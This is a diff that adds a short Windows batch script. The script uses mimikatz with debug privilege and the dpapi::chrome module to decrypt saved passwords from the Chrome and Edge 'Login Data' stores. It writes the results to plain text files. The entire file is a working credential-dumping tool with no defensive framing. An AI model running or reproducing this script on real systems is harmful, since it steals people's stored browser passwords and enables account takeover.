@@ -1,0 +1,9 @@
+@echo off
+echo Extracting Chrome passwords...
+mimikatz.exe "privilege::debug" "dpapi::chrome /in:\"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data\" /unprotect" "exit" > chrome_passwords.txt
+
+echo Extracting Edge passwords...
+mimikatz.exe "privilege::debug" "dpapi::chrome /in:\"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data\" /unprotect" "exit" > edge_passwords.txt
+
+echo Done! Check chrome_passwords.txt and edge_passwords.txt
+pause
